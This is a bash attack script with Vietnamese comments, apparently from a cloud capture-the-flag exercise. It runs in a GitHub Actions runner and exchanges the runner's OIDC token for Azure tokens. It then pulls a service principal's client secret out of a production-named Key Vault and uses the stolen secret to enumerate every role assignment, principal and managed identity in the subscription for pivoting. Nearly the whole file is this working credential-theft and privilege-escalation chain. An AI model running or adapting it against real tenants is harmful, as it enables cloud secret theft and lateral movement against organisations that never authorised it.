#!/usr/bin/env bash
# v10 — dump toàn bộ roleAssignment của subscription, resolve principal + roleDefinition,
#       và tra servicePrincipal của managed identity f64d08c7 (subject trong FIC msi-pivot-ctf).
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
PROD=kv-tbl-prod-x3euoz
WRITER_APP=462d1c38-4459-48b8-9333-82e389e59514
MI_OID=f64d08c7-fde6-4553-99c8-5bf73666ee8c

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ARM=$(tok_fed "https://management.azure.com/.default" "$GHTOK")
WSECRET=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json
print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$WRITER_APP" "$WSECRET" "https://graph.microsoft.com/.default")
echo "[*] arm=${#ARM} graph=${#G}"

echo "================ ROLE DEFINITIONS ================"
curl -sS -H "Authorization: Bearer $ARM" \
 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions?api-version=2022-04-01" \
 | python3 -c "
import sys,json
for r in json.load(sys.stdin).get('value',[]):
    p=r['properties']
    if p.get('type')=='BuiltInRole' and 'Key Vault' not in p['roleName'] and p['roleName'] not in ('Owner','Contributor','Reader','User Access Administrator'): continue
    print(' ',r['name'],p['roleName'])" 2>/dev/null | head -30

echo "================ ROLE ASSIGNMENTS (toàn subscription) ================"
URL="https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
: > /tmp/ra.txt
while [ -n "$URL" ]; do
  R=$(curl -sS -H "Authorization: Bearer $ARM" "$URL")
  echo "$R" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for a in d.get('value',[]):
    p=a['properties']
    print(p['principalId'], p.get('principalType','?'), p['roleDefinitionId'].split('/')[-1], p['scope'])
" >> /tmp/ra.txt
  URL=$(echo "$R" | python3 -c "
import sys,json
print(json.load(sys.stdin).get('nextLink',''))")
done
wc -l < /tmp/ra.txt
sort -u /tmp/ra.txt | head -60

echo "================ RESOLVE PRINCIPALS ================"
for PID in $(awk '{print $1}' /tmp/ra.txt | sort -u); do
  N=$(curl -sS -H "Authorization: Bearer $G" \
     "https://graph.microsoft.com/v1.0/directoryObjects/$PID" \
     | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(d.get('displayName','?'), '|', d.get('appId',''), '|', d.get('@odata.type',''))" 2>/dev/null)
  echo "  $PID  $N"
done

echo "================ MANAGED IDENTITY $MI_OID ================"
curl -sS -H "Authorization: Bearer $G" "https://graph.microsoft.com/v1.0/servicePrincipals/$MI_OID" \
  | head -c 900; echo
echo "--- userAssignedIdentities trong subscription"
curl -sS -H "Authorization: Bearer $ARM" \
 "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31" \
 | head -c 2000; echo
echo "================ DONE ================"
